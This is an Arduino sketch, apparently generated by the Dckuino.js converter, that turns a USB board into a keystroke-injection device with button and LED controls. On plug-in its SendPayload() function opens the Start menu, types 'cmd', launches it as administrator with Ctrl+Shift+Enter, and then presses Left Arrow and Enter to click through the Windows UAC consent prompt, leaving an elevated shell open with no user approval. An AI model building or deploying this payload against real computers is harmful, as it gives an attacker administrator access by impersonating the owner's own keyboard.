/*
 * Generated with <3 by Dckuino.js, an open source project !!!
 */
#include "Keyboard.h"

const int buttonPin = 3;        // The number of the pushbutton pin
// const int ledPin =  17;      // The number of the LED pin (removed - using RX/TX LED)
int ClickCount = 0;             // Counter for button press 
int buttonState = HIGH;         // 
boolean RunPayload = true;      // Determine wheter to run the payload; default=true (first plugin)

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void BlinkLEDs(int BlinkCount) //Blink RX/TX LEDs
{
  for(int i=0; i < BlinkCount; i++){
    RXLED1;
    TXLED1;
    delay(500);
    TXLED0;
    RXLED0; 
    delay(500);
  }
}

void SendPayload()
{
  // This is the function that include all the key typing payload
  Keyboard.begin();     // Begining the Keyboard stream
  delay(500);
  typeKey(KEY_LEFT_GUI);
  delay(500);
  Keyboard.print("cmd");
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  typeKey(KEY_LEFT_ARROW);
  typeKey(KEY_RETURN);
  Keyboard.end();      // Ending stream  

}

/* Init function */
void setup()
{
  pinMode(buttonPin, INPUT_PULLUP);
  TXLED0;
  RXLED0;
  Serial.begin(9600);
  delay(1000); // 1 sec delay to allow device initialization 
}

/* Unused endless loop*/
void loop() {
  // Loop count/time the button press  
  while (digitalRead(buttonPin) == LOW ) {
    ClickCount = ClickCount + 1;
    BlinkLEDs(1);
  }
  /*  IF Button was pressed for 3 seconds than the payload wont run
      IF Button was pressed 1 second than the code will run once - this is in case you want to run the code again after plugin   */
  if (ClickCount >= 3) {
    RunPayload = false;
  } else if (ClickCount == 1) { 
    RunPayload = true;
  }
  ClickCount = 0;       // Reset click counter 
  if (RunPayload) {
    Serial.println("Sending Payload");
    SendPayload();
    RunPayload = false; //make sure the payload wont run again    
    BlinkLEDs(3);       // Blink RX/TX LEDs to indicate send payload done 
  }
  delay(500);
  
}
